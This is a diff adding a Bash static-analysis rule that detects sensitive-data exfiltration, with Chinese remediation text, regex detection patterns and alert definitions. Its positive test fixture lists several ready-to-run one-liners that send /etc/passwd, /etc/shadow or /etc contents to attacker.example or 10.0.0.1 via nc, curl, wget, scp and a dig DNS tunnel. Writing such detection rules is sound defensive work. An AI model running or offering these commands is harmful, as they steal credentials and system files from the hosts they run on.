@@ -1,0 +1,106 @@
+desc(
+	mode: "ssa"
+	language: "bash"
+	title: "Bash: sensitive data exfiltration over the network"
+	title_zh: "Bash：通过网络外传敏感数据"
+	type: vuln
+	level: "high"
+	rule_id: "bash-exfiltration"
+	risk: "information-exposure"
+	desc: <<<DESC
+### 说明
+命令把本机敏感文件送往远端：`nc` 从重定向或管道接收 `/etc/passwd`、
+`/etc/shadow`、SSH 私钥、home 目录数据；`curl -F/-d @file`、`wget
+--post-file` 上传本地文件；`scp`/`rsync` 复制凭据到远端；或通过
+`dig`/`nslookup`/`host` 把 base64 编码后的文件内容带出（DNS 隧道）。
+DESC
+	solution: <<<SOLUTION
+### 修复建议
+立即隔离主机并检查对外连接；限制敏感文件读取权限；在出口防火墙禁止
+非业务外连；对 DNS 查询做长度和熵检测，识别 DNS 隧道。
+SOLUTION
+	reference: <<<REFERENCE
+[CWE-200](https://cwe.mitre.org/data/definitions/200.html)
+REFERENCE
+	alert_min: 1
+	"file://pos.sh": <<<POS
+nc attacker.example 4444 < /etc/passwd
+tar czf - /etc | nc 10.0.0.1 4444
+cat /etc/passwd | nc 10.0.0.1 4444
+base64 /etc/shadow | nc 10.0.0.1 4444
+curl -F "file=@/etc/passwd" https://attacker.example/upload
+curl -d @/etc/shadow https://attacker.example/upload
+wget --post-file=/etc/passwd https://attacker.example/upload
+scp /etc/shadow user@attacker.example:/tmp/
+dig $(base64 /etc/passwd).attacker.example
+POS
+	"safefile://neg.sh": <<<NEG
+curl -fsSL https://example.com/x.sh -o /tmp/x.sh
+nc -z example.com 443
+tar czf /tmp/backup.tar /home/app/data
+dig example.com
+scp /tmp/report.txt user@example.com:/tmp/
+wget -q https://example.com/file.tar.gz
+NEG
+)
+
+/^(nc|ncat|netcat|socat)$/ as $net
+$net(* as $netArgs) as $netCall
+$netCall?{any: /\/etc\/(passwd|shadow|group|gshadow|sudoers)/, /\/root\/\.ssh/, /\/root\/\.bash_history/, /\.ssh\/id_[a-z]/, /\/home\/[A-Za-z0-9_.-]+\/\.ssh/, /\/etc/, /\/root/, /\/home/} as $netExfil
+
+curl(* as $curlArgs) as $curlCall
+$curlCall?{any: /-F/, /--form/, /-d/, /--data/, /--upload-file/, /-T/} as $curlUpload
+$curlUpload?{any: /@\/etc(\/|$)/, /@\/root(\/|$)/, /@\/home\/[A-Za-z0-9_.-]+\//, /@\.ssh\//} as $curlExfil
+
+wget(* as $wgetArgs) as $wgetCall
+$wgetCall?{any: /--post-file/, /--body-file/} as $wgetUpload
+$wgetUpload?{any: /\/etc\//, /\/root\//, /\/home\//, /\.ssh\//} as $wgetExfil
+
+/^(scp|rsync)$/ as $copy
+$copy(* as $copyArgs) as $copyCall
+$copyCall?{any: /\/etc\/(passwd|shadow|sudoers)/, /\/root\/\.ssh\//, /\.ssh\/id_[a-z]/} as $copySensitive
+$copySensitive?{any: /@[A-Za-z0-9_.-]+:/} as $copyExfil
+
+/^(dig|nslookup|host)$/ as $dns
+$dns(* as $dnsArgs) as $dnsCall
+$dnsCall?{any: /\/etc\/(passwd|shadow|group)/, /\.ssh\/id_[a-z]/, /\/root\/\.ssh\//, /\.bash_history/} as $dnsExfil
+
+alert $netExfil for {
+	level: "high",
+	title: "Bash: sensitive data exfiltration over the network",
+	title_zh: "Bash：通过网络外传敏感数据",
+	message: "检测到敏感数据经 nc/ncat/socat 通道外传。",
+	risk: "information-exposure",
+}
+
+alert $curlExfil for {
+	level: "high",
+	title: "Bash: sensitive data exfiltration over the network",
+	title_zh: "Bash：通过网络外传敏感数据",
+	message: "检测到 curl 上传本地敏感文件。",
+	risk: "information-exposure",
+}
+
+alert $wgetExfil for {
+	level: "high",
+	title: "Bash: sensitive data exfiltration over the network",
+	title_zh: "Bash：通过网络外传敏感数据",
+	message: "检测到 wget 上传本地敏感文件。",
+	risk: "information-exposure",
+}
+
+alert $copyExfil for {
+	level: "high",
+	title: "Bash: sensitive data exfiltration over the network",
+	title_zh: "Bash：通过网络外传敏感数据",
+	message: "检测到 scp/rsync 把敏感文件复制到远端。",
+	risk: "information-exposure",
+}
+
+alert $dnsExfil for {
+	level: "high",
+	title: "Bash: sensitive data exfiltration over the network",
+	title_zh: "Bash：通过网络外传敏感数据",
+	message: "检测到编码后的数据经由 DNS 查询外传。",
+	risk: "information-exposure",
+}
